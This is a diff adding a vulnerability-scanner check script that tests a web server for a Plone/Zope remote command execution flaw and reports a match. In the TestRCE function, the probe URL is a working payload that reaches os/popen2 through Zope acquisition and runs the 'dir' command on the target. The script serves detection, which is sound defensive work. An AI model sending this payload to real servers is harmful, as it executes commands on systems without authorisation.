@@ -1,0 +1,69 @@
+#include helpers.inc;
+#include classMatches.inc;
+// **************************************************************************************							 
+function alert(fname, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(fname);
+	ri.affects = "Web Server";
+	ri.alertPath = "Scripts/" + fname; 	
+		
+	ri.setHttpInfo(lastJob);
+	
+	if (matchedText) 
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";	
+	
+	addHTTPJobToCrawler(lastJob, 1, 1);
+	AddReportItem(ri);	
+}							 
+// **************************************************************************************							 
+function request(uri)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = scanURL;
+	lastJob.addCookies = false;
+	lastJob.verb = 'GET';
+	lastJob.URI = uri;
+	lastJob.execute();	
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && !lastJob.notFound)
+	{
+		return true;
+	}	
+	
+	return false;
+}
+// **************************************************************************************
+function TestRCE()
+{
+	var urls = [
+					"/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir"
+				];
+	
+	matches.plainArray = [
+					  ];
+	
+	matches.regexArray = [
+						/(<title><open file '<fdopen>', mode 'wb' at 0x[a-zA-Z0-9]+><\/title>)/
+					  ];	
+	
+	for (var i=0;i<urls.length;i++)
+	{ 	
+		if (request(urls[i]))
+		{
+			var matchedText = matches.searchOnText(lastJob.response.body);	
+			if (matchedText)
+				alert("Plone&Zope_RCE.xml", matchedText); 	
+		}
+	}
+}
+// **************************************************************************************	
+function startTesting()
+{
+	TestRCE();
+}
+/***********************************************************************************/
+/* main entry point */
+var matches = new classMatches();
+var lastJob = null;
+startTesting();
